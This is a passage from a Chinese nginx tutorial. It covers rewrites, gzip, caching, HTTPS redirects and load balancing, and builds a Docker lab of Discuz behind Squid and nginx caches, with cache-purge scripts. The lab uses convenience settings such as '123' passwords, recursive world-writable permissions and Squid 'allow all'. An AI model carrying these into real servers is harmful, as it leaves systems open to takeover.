rewrite goods-(\\d+).html /test.html permanent;}#访问http://yichen.com/goods-122.html 会直接永久重写到/test.html的内容，且url会跳转到http://yichen.com/test.html 例： 1234567server { ... rewrite ^(/download/.*)/media/(.*)\\..*$ $1/mp3/$2.mp3 last; rewrite ^(/download/.*)/audio/(.*)\\..*$ $1/mp3/$2.ra last; return 403; ...} 但是，如果将这些指令放在“ /download/”位置，last则应将标志替换为 break，否则nginx将执行10个循环并返回500错误： 12345location /download/ { rewrite ^(/download/.*)/media/(.*)\\..*$ $1/mp3/$2.mp3 break; rewrite ^(/download/.*)/audio/(.*)\\..*$ $1/mp3/$2.ra break; return 403;} 如果*replacement*字符串包含新的请求参数，则先前的请求参数将附加在它们之后。如果不希望这样，请在替换字符串的末尾添加问号，避免附加它们，例如： 1rewrite ^/users/(.*)$ /show?user=$1? last; 指令5: set 语法： set $variable value; 默认： - 可以同的块： server，location，if value为指定的 设置variable。该value可以包含文本，变量，他们的组合 set是设置变量用的，可以用来达到多个条件判断时做标记用，如下 判断是IE浏览器并重写，其不用break退出。也能防止死循环。 1234567891011 if ($http_user_agent ~* trident) { set $isie 1;} #如果是IE isie变量的值为1 if ($fastcgi_script_name = ie.html){ set $isie 0; #如果跳转到路径名是ie.html isie变量的值为0} if ($isie = 1) { rewrite ^(.*)$ /ie.html;} 1.url重写实战访问指定的html就重写到真实的地址 12345678910111213location /ecshop { rewrite 'goods-(\\d{1,7})\\.html' /ecshop/goods.php?id=1;}#只要匹配的goods-3454.html,就重写到/ecshop/goods.php?id=1;的内容。location /ecshop { rewrite 'goods-(\\d{1,7})\\.html' /ecshop/goods.php?id=$1;}#只要匹配的goods-3454.html,就重写到/ecshop/goods.php?id=3454的内容。目的在于不让客户端知道/etcshop/goods.php?id=3454的这个参数。 6. gzip压缩提升网站速度官网文档 1http://nginx.org/en/docs/http/ngx_http_gzip_module.html 常用参数 123456789gzip on|off; 是否开启gzipgzip_buffers 32 4k | 16 8k 缓冲(压缩在内存中缓冲几块?每块多大?)gzip_comp_level [1-9] 推荐6 压缩级别(级别越高，压的越小。也浪费cpu资源)gzip_disable #正则匹配UA 什么样的url不进行gzipgzip_http_version 1.0 | 1.1 开始压缩的http协议版本。(可以不用设置)gzip_min_length 1000; 设置将被压缩的响应的最小长度。(再小就不用压缩了，意义不大)gzip_proxied ;响应为代理请求启用或禁用响应的压缩gzip_types text/plain application/xml; #对哪些类型的文件用压缩。gzip_vary on|off #是否传输gzip压缩标志，是否告诉客户端是否有压缩。 注意: 图片和视频 这样的二进制文件，不必压缩 因为压缩比比较小，比如100-&gt;80 字节。而且压缩也是耗费cpu资源的。 7.expires缓存提升网站负载官网文档 1http://nginx.org/en/docs/http/ngx_http_core_module.html 设置过期时间。 在location 或if段里来写 格式 expires 30s expires 30m; 30分过期 expires 2h; 2小时 expires 30d; 30天。 123456789101112location /images/ { try_files $uri /images/default.gif;}location = /images/default.gif { expires 30s;} 表示/images/default.gif这个里面的图片在客户浏览器中30秒后过期。。location ~* \\.(jpg|jpeg|gif|png) { expires 1d;}#只要是图片都1天后才过期。 注意：服务器的日期要准确。 另: 304也是一种很好的缓存手段 8.HTTP跳转HTTPS协议几种方式性能对比我这里已http://yichen2.com 为例，要求所有访问该页面的请求全部跳转至https://yichen2.com, 并请求的uri 和参数$query_string 要保留下来。 常见的几种方法: 1.使用if进行协议判断 –最差 这种情况下，多为把http和https写在同一个server中，配置如下: 123456789101112131415161718 server { listen 80 default_server; listen 443 ssl; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; ssl_certificate /root/ssl/yichen2.crt; ssl_certificate_key /root/ssl/yichen2.key; charset utf-8; if ( $scheme = http ) { rewrite ^/(.*)$ https://yichen2.com/$1 permanent ;} location / {}} 这种配置看起来简洁很多，但是性能是最差的，首先每次连接进来都需要nginx 进行协议判断，其次判断http 协议时进行地址匹配、重写、返回、再次判断，最后还有正则表达式的处理… …. 所以，生产上我们极不建议 这种写法。另外，能少用if 的尽量不用，如果一定要使用，也最好在location 段，并且结合ruturn 或者rewrite ... last 来使用。 2.rewrite 方法1 –差 一般80端口 443 ssl端口不要写在同一个server 中，这样虽然代码简洁了一些，但是性能并不是很好。 12345678910111213141516 server { listen 80 default_server; listen 443 ssl; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; ssl_certificate /root/ssl/yichen2.crt; ssl_certificate_key /root/ssl/yichen2.key; charset utf-8; rewrite ^/(.*)$ https://yichen2.com/$1 permanent; location / {}} 测试 123456789curl -k -I yichen2.com/a.html?a=3HTTP/1.1 301 Moved PermanentlyServer: nginx/1.16.1Date: Mon, 29 Jun 2020 22:10:12 GMTContent-Type: text/htmlContent-Length: 169Connection: keep-aliveLocation: https://yichen2.com/a.html?a=3 可以看到实现了http 到https的跳转。并且保留了参数 3.rewrite 方法2 –好 不使用正则表达式。而使用变量来提升性能: 12345678910111213141516171819server { listen 80; server_name yichen2.com; rewrite ^ https://yichen2.com$request_uri? permanent;}server { listen 443 ssl; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; ssl_certificate /root/ssl/yichen2.crt; ssl_certificate_key /root/ssl/yichen2.key; charset utf-8; location / {}} 注意: $request_uri 已经包含了查询参数，所以要在其重写规则后面加上? 以禁止再次传递参数，这种方法避免了nginx 内部处理正则的性能损坏，相比较上面的方式好了很多。 4.return 301实现最优解 – 最好 虽然上面我们使用参数代替了正则，但是rewrite 规则会先对url 进行匹配，匹配上了再执行相应的规则，而 return 没有匹配url 层面的性能消耗，直接返回用户新的连接，所以是最优的解决方案。 123456789101112131415161718server { listen 80; server_name yichen2.com; return 301 https://$host$request_uri ;}server { listen 443 ssl; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; ssl_certificate /root/ssl/yichen2.crt; ssl_certificate_key /root/ssl/yichen2.key; charset utf-8; location / {}} 注意: 在return 中， $request_uri 后面不用加? (加? 用来避免携带参数是rewrite 中的特性)。 如果希望实现永久重定向，则使用return 301 https://$host$request_uri , 不过想要两个域名都会使用，所以更多情况下使用302 临时重定向。 301重定向和302重定向的区别 302重定向只是暂时的重定向，搜索引擎会抓取新的内容而保留旧的地址，因为服务器返回302，所以，搜索搜索引擎认为新的网址是暂时的。 而301重定向是永久的重定向，搜索引擎在抓取新的内容的同时也将旧的网址替换为了重定向之后的网址。 5.关于错误497 495 496的配置 495和496表示证书错误和没有证书。 497表示http跳转https错误。一般是通过http访问了其他https端口。比如: http://yichen2.com:2020 此时2020端口是https的。通过http访问就会报错误。这种情况可以跳转指定uri。 123456789101112131415161718192021222324252627282930313233server { listen 80; server_name yichen2.com; return 301 https://$host$request_uri ;}server { listen 888; listen [::]:888; server_name yichen2.com; root /software/yichen2.com/html;}server { listen 443 ssl http2; listen [::]:443 ssl http2; listen 2020 ssl http2; listen [::]:2020 ssl http2; listen 999 ssl http2; listen [::]:999 ssl http2; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; error_page 495 496 http://$host:888; #证书有问题或者过期。就直接跳转http:888端口 error_page 497 https://$host:2020; #http跳转https有问题。就直接默认跳转指定端口 ssl_certificate /root/ssl/yichen2.crt; ssl_certificate_key /root/ssl/yichen2.key; charset utf-8; location / {}} 3.nginx负载均衡参考文档 1http://nginx.org/en/docs/http/ngx_http_upstream_module.html 1.基础负载均衡 客户端 —-&gt; nginx .html —-&gt; proxy_pass —-&gt; apache 或 php 这种动静分离。动静分离不是一个严谨的说法。叫反向代理比较规范。 反向代理后端如果有多台服务器，自然可形成负载均衡。 但 prox_pass 如何指向多台服务器呢？ 123456location / { proxy_pass http://192.168.224.11/; proxy_pass http://192.168.224.12/; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } 这样是会出现错误。 解决办法。 把多个台服务器用 upstream 指定绑定在一起并起个组名。 然后 proxy_pass 指向该组。 1234567891011 upstream backendweb { server yichen2.com:81 weight=1 max_fails=2 fail_timeout=1s; server server2.com:82 weight=1 max_fails=2 fail_timeout=1s;}这样就可以了。location / { proxy_pass http://backendweb; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } 模块用于定义可以由proxy_pass， fastcgi_pass， uwsgi_pass， scgi_pass， memcached_pass和 grpc_pass指令引用的服务器组 参数说明: weight 表示权重。默认为1 。 max_fails = 2 表示持续时间内与服务器通信失败2次，则认为该服务器不可用。 fail_timeout=1s 代表健康检查(检查后台web是否ok，访问超时1秒，并两次超时，则认为不健康 负载均衡(lb load banlance)一般要注意四个方面: 1,算法 round-robin 2,健康检查 3,会话保持 4,数据一致 rsync drbd 共享存储 分布式存储 2.使用ip_hash.实现同一ip客户端一旦调到一台，就一直调那一台 12345 upstream backendweb { ip_hash; #在上个例子的基础上只加这一句; server yichen2.com:81 weight=1 max_fails=2 fail_timeout=1s; server server2.com:82 weight=1 max_fails=2 fail_timeout=1s;} nginx的ip_hash的意思是,如果一个客户端的访问被调度到其中一台后台服务器,那么同一个源IP来的 访问都只会被调到这个后台服务器；这里测试时，如果都用同一个网段的内网IP来做客户端测试，可能会 都只转到一个后台（因为nginx的hash算法是按网段来算的，如果是公网不同网段的客户端IP就不一样了） 对于nginx的upstrem算法总结: 1,round-robin 轮循（平均分配） 2,weight 权重（人为地分配权重，用于后台服务器性能不均的情况） 3,fair 响应时间（按后台的响应时间来分配，需要第三方模块，但如果后台服务器都在内网，就没太大必要使用这种算法了） 4,url_hash 按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为多台缓存时比较有效，提高缓存命中率（后面例子会讲） 5,ip_hash 在负载均衡的基础上加上会话保持（优点是配置方便，缺点是不能完全的负载均衡） 4.nginx常用搭建方式1.网站的数据切分 什么是网站数据切分? 其实也是七层调度 比如我要把新浪新闻，新浪体育给分开 方法1: 用DNS的二级域名(直接dns解析成不同的ip) 新浪新闻 news.sina.com 新浪国内新闻 news.sina.com/china/ –说明没有用二级域名 ​ 新浪国际新闻 news.sina.com/world/ ​ 新浪国内新闻 china.news.sina.com #用了四级域名 ​ 新浪国际新闻 world.news.sina.com 新浪体育 sports.sina.com 新浪体育nba sports.sina.com/nba/ ​ 新浪体育nba nba.sports.sina.com 方法2: 前端使用代理(squid,varnish,apache,nginx,haproxy) 通过代理软件七层调度来分离 location 网站数据切分 ​ client(宿主机) 192.168.2.x ​ 192.168.2.19 ​ nginx（虚拟机1） ​ 192.168.224.10 ​ web1(虚拟机2) web2(虚拟机3） ​ 192.168.224.11 192.168.224.12 nginx配置如下 1234567891011location /nba/ { proxy_pass http://192.168.224.11/; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } location /cba/ { proxy_pass http://192.168.224.12/; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } 然后重启 接着在11和12服务器上操作 123456在11和12操作yum install -y httpdecho web2 &gt; /var/www/html/index.htmlsystemctl restart httpdcurl 192.168.224.12 客户端验证 12345http://192.168.2.19/nba/web1http://192.168.2.19/cba/web2 2.网站动静分离 把location段修改为如下 1234567891011location ~* \\.(html|htm|gif|jpeg|jpg|css|js|png|swf)$ { proxy_pass http://192.168.224.11; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } #静态文件走这台服务器 location ~ \\.(php|cgi|txt)$ { proxy_pass http://192.168.224.12; #使用正则表达式IP后面不用加/号，会报错 proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } #动态文件php|cgi等，走这台服务器。 5.nginx集群搭建​ client 192.168.2.x ​ | ​ | 192.168.2.19(模拟网站公网ip，整个架构的域名假设为server1.com ) ​ nginx 反向代理 192.168.224.10 ​ ｜ ​ －－－－－－－－－－－ ​ ｜ ｜ 命中 hit 直接返回 动态程序文件.php ｜ | ​ ｜ squid（web加速，缓存静态文件或图片) 直接找web ｜ | 192.168.224.12 ​ －－－－ | 没命中 miss 找后端web去取 ​ ｜ | ​ lnmp &lt;—- | ​ 192.168.224.11 实验前准备： 1,所有机器配置主机名并在/etc/hosts里互相绑定主机 2,几台服务器都能互相连接ping通 创建4台centos 123456789101112131415创建网络docker network create -d bridge mynginx创建centos容器。centos容器docker run -it --restart=always --privileged=true --name centos -p 88:80 -h centos --network mynginx -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/initcentos1容器docker run -it --restart=always --privileged=true --name centos1 -p 8080:80 -h centos1 --network mynginx -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/initcentos2容器docker run -it --restart=always --privileged=true --name centos2 -h centos2 --network mynginx -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/initcentos3容器docker run -it --restart=always --privileged=true --name centos3 -h centos3 --network mynginx -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/init 分别进去容器测试是否正常ping通 123456789101112131415161718192021222324docker exec -it centos /bin/bashdocker exec -it centos1 /bin/bashdocker exec -it centos2 /bin/bashdocker exec -it centos3 /bin/bash安装相关命令yum provides ipyum install -y iproute net-tools vimping centos1ping centos2ping centos3vim /etc/hosts增加172.30.0.2 centos centos.com172.30.0.3 centos1 centos1.com172.30.0.4 centos2 centos2.com172.30.0.5 centos3 centos3.com 开始部署 第一大步:配置discuz论坛1.在上图中的lnmp服务器上安装并配置discuz论坛 centos1上操作 12345678910yum install epel-release -y yum install mariadb mariadb-server php php-mysql php-gd libjpeg\\* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash php-fpm php-pecl-zendopcache nginx -yrpm -qa|grep phpsystemctl restart mariadb.servicesystemctl enable mariadb.servicesystemctl status mariadb.service设置新密码mysqladmin password '123.yichen' 2.优化php-fpm 优化php-fpm，并启动(php-fpm为php的fastcgi模式，简单来说就是php的服务模式) 12345678910111213141516171819 vim /etc/php-fpm.d/www.conf #打开php-fpm主配置文件并进行优化(以下优化在生产环境视具体情况而定) 12 listen = /var/run/php-fpm/fastcgi.socket #原来是监听127.0.0.1:9000也是可以的，我这里换成socket来做(本机连接可以使用socket或tcp/ip协议方式，远程连接只能使用tcp/ip协议方式)31 listen.owner = nginx32 listen.group = nginx #socket文件的权限设置。用户与组和跑nginx服务的用户一致，避免权限问题（如果前面使用的是tcp/ip的方式，这里就注释就好)33 listen.mode = 066639 user = nginx #用户与组和跑nginx服务的用户一致，避免权限问题 41 group = nginx60 pm = dynamic #对于专用服务器，pm可以设置为static。如果选择static，则由pm.max_children指定固定的子进程数。如果选择dynamic,则可以动态调整下面几个参数70 pm.max_children = 64 #子进程最大数,我这里只是参考值（看系统资源决定，视实际环境测试后调整，下几个参数也一样）75 pm.start_servers = 20 #启动时默认启动的进程数80 pm.min_spare_servers = 5 #保证空闲进程数最小值，如果空闲进程小于此值，则创建新的子进程85 pm.max_spare_servers = 35 #保证空闲进程数最大值，如果空闲进程大于此值，此进行清理160 rlimit_files = 65535 #打开的文件描述符数量，不能大于系统的限制（系统可以使用ulimit命令查看和设置，后面有例子)218 php_flag[display_errors] = on #打开php错误显示功能 修改php-fpm的权限 1chown nginx.nginx /var/run/php-fpm/ -R 设置系统打开的文件描述符数量，与上面的配置对应 12345ulimit -nulimit -SHn 65535echo &quot;ulimit -SHn 65535&quot; &gt;&gt; /etc/rc.local （设置永久生效） 启动php-fpm服务 123systemctl start php-fpm.servicesystemctl status php-fpm.service systemctl enable php-fpm.service 3.配置nginx nginx的配置server段修改如下 12345678910111213141516171819 server { listen 80 default_server; listen [::]:80 default_server; server_name centos1.com; root /usr/share/nginx/html; index index.php index.html; include /etc/nginx/default.d/*.conf; location / { } location ~\\.php$ { fastcgi_pass 127.0.0.1:9000; #表示转发到本地的9000端口php处理此类文件 fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; include /etc/nginx/fastcgi.conf;} 启动 1234systemctl start nginx.service #80端口不要被其它服务（如httpd）占用了systemctl enable nginx.servicesystemctl status nginx.service curl -I 127.0.0.1 #(访问本机80端口，验证Nginx服务) 4.测试nginx工作是否支持PHP 在nginx家目录里加上php测试页 12345 vim /usr/share/nginx/html/test.php &lt;?php phpinfo();?&gt; 在浏览器输入地址 123http://server1.com:8080/test.phpcurl -i centos1.com/test.php 如果有出现php的版本信息，说明架构搭建好了。 1,解压discuz到nginx家目录 1234567891011yum install -y unzipmkdir /usr/share/nginx/html/discuz/通过主机把包往容器里面复制。docker cp Discuz_X3.3_SC_UTF8.zip centos1:/usr/share/nginx/html/discuz/unzip Discuz_X3.3_SC_UTF8.zip -d /usr/share/nginx/html/discuz/cd /usr/share/nginx/html/discuz/mv upload/* ./ rm upload/ -rf 环境检查这一步，有些目录和文件权限需要修改(下面直接使用简单方式全改成nginx的owner和group) 1chown nginx.nginx /usr/share/nginx/html/discuz -R 2.mariadb数据库授权 123456mysql -pMariaDB [(none)]&gt; create database discuz; #创建一个库，用于存放将要安装的discuz论坛的表MariaDB [(none)]&gt; grant all on discuz.* to 'discuz'@'localhost' identified by '123'; #授权一个用户，用于discuz论坛程序连接mysqlMariaDB [(none)]&gt; flush privileges; 3.开始访问 123456789101112http://192.168.224.11:8080/discuz/填上对应的数据库地址,库,用户,密码。开始安装 On web page wizard: 选择：全新安装 Discuz! X (含 UCenter Server) 数据库名:discuz 数据库用户名：discuz 数据库密码：123 管理员密码：123 重复密码：123如果发现权限不可写，把权限改下就可以了。chmod o+w /usr/share/nginx/html/discuz/* -R 4.测试论坛 1http://192.168.224.11:8080/discuz/forum.php 测试论坛 第二大步:在上图中的nginx服务器上安装并配置nginxcentos上操作 这部可以在宿主机操作 1yum install nginx -y 配置文件如下 http段的内容 1234567891011121314151617181920212223242526272829303132upstream squid { server centos2.com;}upstream web { server centos1.com;} server { listen 80 default_server; listen [::]:80 default_server; server_name 192.168.224.11; #替换为实际的名字 root /usr/share/nginx/html; include /etc/nginx/default.d/*.conf; location ~ .*\\.php$ { proxy_pass http://web; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } location ~ .*\\.(html|htm|gif|jpeg|jpg|css|js|png|swf)$ { proxy_pass http://squid; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } location / { proxy_pass http://squid; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } 重启nginx 1systemctl restart nginx 第三大步:安装并配置squid1.在上图中的squid服务器上安装并配置squid 1yum install squid -y 2.配置squid主配置文件 123456789101112 vim /etc/squid/squid.conf http_access allow all #把这一行前面的全删除，再把这行修改成允许所有。注意！有多个重复的http_access，都要删除 http_port 80 accel vhost vport #修改成支持反向代理模式，端口也为80与nginx的配置对应(这里如果用3128也可以，nginx和这里对应的端口也要改成3128，并且后面清缓存的http://192.168.2.19/static/image/common/logo.png要改成http://192.168.2.19:3128/static/image/common/logo.png)cache_dir ufs /var/spool/squid 256 16 256 #打开缓存目录的定义这一句cache_peer 172.30.0.3 parent 80 0 no-query originserver name=web 172.30.0.3是 lnmp servercache_peer_domain web 192.168.224.11 #加上这两句,表示代理后台的lnmp的80端口;server1.com为网站的域名,192.168.2.19为我这个架构最前端的nginx的IP 3,启动squid 12345 yum install openssl -y #需要安装OpenSSL，否则无法启动squid在/etc/hosts中配置nginx的外部网卡IP和域名的绑定systemctl restart squid 查询目前所有缓存的资料 1/usr/bin/squidclient -p 80 mgr:objects | grep png 第四大步:验证在客户端机器192.168.2.x上首先绑定静态DNS #用于模拟DNS，如果不绑定，也可以直接使用公网IP192.168.2.19来访问，因为在squid里配置了（cache_peer_domain web server1.com 和 cache_peer_domain web 192.168.2.19 两句) cat /etc/hosts 192.168.2.19 server1.com #IP要为前端nginx的IP，名字为这个网站的域名要和squid里的cache_peer_domain web server1.com 要对应 1,在客户端用firefox访问http://server1.com/discuz或http://192.168.2.19/discuz是可以正常看到我的lnmp安装的discuz论坛 2,在客户端使用下面的命令验证discuz论坛的一个logo,可以看到在squid上命中的信息 1curl -I http://192.168.224.11:/discuz/static/image/common/logo.png [ 3,关闭squid,在客户端用firefox访问,会发现整个网站都没有图片(静态的元素) 用curl -I http://server1.com/discuz/static/image/common/logo.png来验证也会报错 12curl -I http://server1.com/discuz/static/image/common/logo.png报502错误 因为我的架构里只有一台squid,再次启动squid后,一切又恢复正常 4,关于squid手动清缓存 123456789vim /etc/squid/squid.confacl purge_admin src 127.0.0.1 #设定管理员为purge_admin 从本地可以清除缓存acl purge method PURGE http_access allow purge_admin purge #允许purge_admin执行purgehttp_access deny all purge #默认禁止所有用户操作清除缓存 systemctl restart squid 最基本的清除一条缓存的操作,必须要在squid本机执行 123squidclient -m PURGE -h 127.0.0.1 -p 80 http://192.168.224.11/discuz/static/image/common/logo.png# -h参数后只能接127.0.0.1;-p 80是squid的监听端口;最后的路径就是客户端访问的路径清除缓存后再到客户端访问，就变成miss了 如果要批量清除squid,可以使用下面的脚本(你需要修改成自己对应的路径) 1234567891011121314151617 vim /tmp/purge_squid.sh #!/bin/bashsquidcache_path=&quot;/var/spool/squid/&quot;squidclient_path=&quot;/usr/bin/squidclient&quot;grep -a -r $1 $squidcache_path/* | strings | grep ^&quot;http&quot; | while read urldo$squidclient_path -h 127.0.0.1 -m PURGE -p 80 $url &gt; /dev/null 2&gt;&amp;1echo &quot;$url被清除&quot;done注意：脚本的squidcache_path修改成你对应的缓存目录，squidclient_path修改成squidclient命令的路径；-h 127.0.0.1是因为我做了acl限制的，所以只能在squid本机上清除批量清除的方法:sh /tmp/purge_squid.sh .txt #表示清除所有的.txt结尾的缓存sh /tmp/purge_squid.sh . #表示清除所有缓存sh /tmp/purge_squid.sh /aaa/ #表示url里有/aaa/路径就清掉缓存 在上面的架构基础上多加一台squid2(我这里IP为172.30.0.5), client 192.168.2.x ​ | ​ | 192.168.2.19 ​ nginx ​ | 192.168.224.11 ​ | ​ |————|————— ​ | | | ​ | squid1 squid2 centos3.com ​ | centos2.com ​ |————| ​ | ​ | ​ lnmp ​ centos1.com 以下练习在Squid2进行： 12yum install openssl -yyum install squid -y 在squid2中安装squid软件，配置文件与squid服务器中的配置保持一致/etc/squid/squid.conf 1234567891011121314151617181920212223242526272829vim /etc/squid/squid.confhttp_access allow allacl purge_admin src 127.0.0.1acl purge method PURGEhttp_access allow purge_admin purgehttp_access deny all purge# Squid normally listens to port 3128http_port 80 accel vhost vport# Uncomment and adjust the following to add a disk cache directory.cache_dir ufs /var/spool/squid 256 16 256cache_peer 172.30.0.3 parent 80 0 no-query originserver name=webcache_peer_domain web server.example.comcache_peer_domain web 192.168.224.11# Leave coredumps in the first cache dircoredump_dir /var/spool/squid## Add any of your own refresh_pattern entries above these.#refresh_pattern ^ftp: 1440 20% 10080refresh_pattern ^gopher: 1440 0% 1440refresh_pattern -i (/cgi-bin/|\\?) 0 0% 0refresh_pattern . 0 20% 4320 重启2台squid服务器上的squid服务 1systemctl restart squid 做法，在nginx配置要修改为下面一段 1234567upstream squid { server 172.30.0.4 weight=1 max_fails=2 fail_timeout=3s; server 172.30.0.5 weight=1 max_fails=2 fail_timeout=3s;}systemctl restart nginx 在客户端用curl -I去测试多个不同的文件请求，看缓存情况,如: 12345curl -I http://server1.com/discuz/static/image/common/logo.pngcurl -I http://server1.com/discuz/static/image/feed/task_b.pngcurl -I http://server1.com/discuz/static/image/feed/album_b.pngcurl -I http://server1.com/discuz/static/image/feed/portal_b.pngcurl -I http://server1.com/discuz/static/image/feed/wall_b.png 测试结果为:第一次squid1(conts2),第二次squid2(centos3),第三次squid1…以此类推(round-robin) 但这个做法的缺点为:比如同一个url的请求，连续访问，它也会RR轮循给squid1和squid2，这样会造成两个squid重复缓存。 改进的做法为:使用nginx的url_hash的算法，把同一个url的请求只给同一个后台squid，以提高缓存命中率。如果要做这个改进的话，只需要把nginx的配置再修改成如下: 12345upstream squid { hash $request_uri; server 172.30.0.4 weight=1 max_fails=2 fail_timeout=3s; server 172.30.0.5 weight=1 max_fails=2 fail_timeout=3s;} 再次测试: 结果为:新的请求仍然会RR轮循调给squid1和squid2，但已经请求过的地址再次被请求，会调给第一次调的squid，提高缓存命中率。 查询缓存 1/usr/bin/squidclient -p 80 mgr:objects | grep png nginx又做反向代理又做缓存在上面的架构中，把squid去掉，由nginx又做反向代理，又做缓存 nginx做缓存需要一个另外一个软件(ngx_cache_purge) 下载网址为 1wget http://labs.frickle.com/files/ngx_cache_purge-2.3.tar.gz 这时候nginx需要重新源码安装， 123下面的源码包都可以，一个是旧版本，一个是新版本。wget http://nginx.org/download/nginx-1.8.1.tar.gzwget http://nginx.org/download/nginx-1.12.2.tar.gz 架构图，在上面做的基础上把squid去掉。 client 192.168.2.x ​ | ​ | 192.168.2.19 ​ nginx 反向代理加缓存 ​ | 192.168.224.11 ​ | ​ lnmp ​ cetos1.com 192.168.224.11虚拟机在上一个实验的基础上继续做。但是需要停掉nginx（恢复快照也可以，但是要 自己创建nginx用户，useradd -s /usr/sbin/nologin nginx 12ystemctl stop nginxsystemctl disable nginx 第一步: 先把squid停掉 使用源码版本编译 1yum install pcre-devel zlib-devel gcc openssl-devel -y 复制压缩包到本地 12345678tar xf nginx-1.8.1.tar.gz -C /usr/src/tar xf ngx_cache_purge-2.3.tar.gz -C /usr/src/cd /usr/src/nginx-1.8.1/./configure --prefix=/usr/local/nginx --user=nginx --group=nginx --with-http_gzip_static_module --with-http_stub_status_module --add-module=../ngx_cache_purge-2.3/使用--add-module=../ngx_cache_purge-2.3/参数加上缓存模块的功能，两个目录是同级目录（从编译的路径可以看出来） 如果上一步执行报错需要安装gcc: yum -y install gcc 1make &amp;&amp; make install 第二步： 修改nginx主配置文件 1vim /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253user nginx;worker_processes auto;error_log logs/error.log info;pid logs/nginx.pid;events { worker_connections 65535; use epoll;}http { include mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$upstream_cache_status&quot;'; sendfile on; tcp_nopush on; keepalive_timeout 65; gzip on; proxy_temp_path /usr/local/nginx/proxy_temp_dir 1 2; proxy_cache_path /usr/local/nginx/proxy_cache_dir/cache levels=1:2 keys_zone=cache:100m inactive=1d max_size=10g; upstream web { server 172.30.0.3 weight=1 max_fails=2 fail_timeout=30s;} server { listen 80; server_name server1.com; access_log logs/host.access.log main; location / { proxy_pass http://web; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; proxy_cache cache; proxy_cache_key $host$uri$is_args$args; proxy_cache_valid 200 304 10m; add_header X-Cache '$upstream_cache_status from $host'; expires 1d; } location ~ .*\\.(php|cgi)$ { proxy_pass http://web; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } }} 上面的配置参数说明 1、http段设置。 proxy_temp_path /usr/local/nginx/proxy_temp_dir; #设置临时目录 proxy_cache_path /usr/local/nginx/proxy_cache_dir/cache levels=1:2 keys_zone=cache:100m inactive=1d max_size=10g; keys_zone=cache:100m #表示这个zone名称为cache，分配的内存大小为100MB /usr/local/nginx/proxy_cache_dir/cache #表示cache这个zone的文件要存放的目录 levels=1:2 #表示缓存目录的第一级目录是1个字符，第二级目录是2个字符，即/usr/local/nginx/proxy_cache_dir/cache/a/1b这种形式 inactive=1d #表示这个zone中的缓存文件如果在1天内都没有被访问，那么文件会被cache manager进程删除掉 max_size=10g 表示这个zone的硬盘容量为10GB 2、server段设置 proxy_cache cache; #设置缓存共享内存区块，也就是keys_zone名称 proxy_cache_key $host$uri$is_args$args; #设置缓存key proxy_cache_valid 200 304 10m; #设置http状态码为200,304缓存时间为10分钟 add_header X-Cache ‘$upstream_cache_status from $host’; #$upstream_cache_status表示资源缓存的状态，有HIT MISS EXPIRED三种状态 expires 1d; #设置失期时间，为1天 保存主配置文件后，建立对应的缓存目录 123mkdir /usr/local/nginx/proxy_cache_dir/cache -pls /usr/local/nginx/proxy_cache_dir/cache 启动nginx /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx -t 如果遇到句柄限制就执行 ulimit -n 65535 参考：停止服务 /usr/local/nginx/sbin/nginx -s stop 警告信息没有了 创建软连接，可以方便启动 ln -s /usr/local/nginx/sbin/nginx /usr/local/sbin/nginx nginx -s quit 停止nginx 第三大步： 客户端测试 1234561，使用下面的命令访问 curl -I http://192.168.224.11/discuz/static/image/common/logo.pngcurl -I http://192.168.224.11/discuz/static/image/common/logo.png第一次为MISS 第二次为HIT 2，在客户端用户firefox访问http://192.168.224.11/discuz,可以访问整个discuz论坛 在nginx上查看缓存目录，会看到很多子目录（缓存都在这些目录里) 1ls /usr/local/nginx/proxy_cache_dir/cache 3,nginx的缓存清除 在nginx服务器写一个脚本，如下 1234567891011vim /tmp/purge_nginx_cache.sh#!/bin/bashcachedir=/usr/local/nginx/proxy_cache_dir/cachegrep -ra $1 $cachedir |grep $1 | awk -F':' '{print $1,$3}'|while read cacheurl urldo rm -rf $cacheurl echo &quot;$url 被清除&quot;doneecho &quot;缓存清除成功&quot; 清除方法为 1bash /tmp/purge_nginx_cache.sh .png$ #清除所有的.png结尾的缓存 手动搜索缓存文件，txt后面要有$符号 1grep -ra .png$ /usr/local/nginx/proxy_cache_dir/cache/ 6，nginx优化1.ab压力测试及nginx性能统计模块12345678windos下载地址https://www.apachehaus.com/cgi-bin/download.plxyum install -y httpd #安装httpd 就有ab 这个工具了。yum -y install httpd-tools #或者只下载工具测试场景：模拟1000个用户，对首页发起总共5万次请求。ab -c 1000 -n 50000 http://192.168.224.12/index.html ab常用参数的介绍： -n ：总共的请求执行数，缺省是1； -c： 并发数，缺省是1； -t：测试所进行的总时间，秒为单位，缺省50000s -p：POST时的数据文件 -k 启用HTTP KeepAlive功能，即在一个HTTP会话中执行多个请求。默认时，不启用KeepAlive功能 -w: 以HTML表的格式输出结果 继续测试 12ab -c 2000 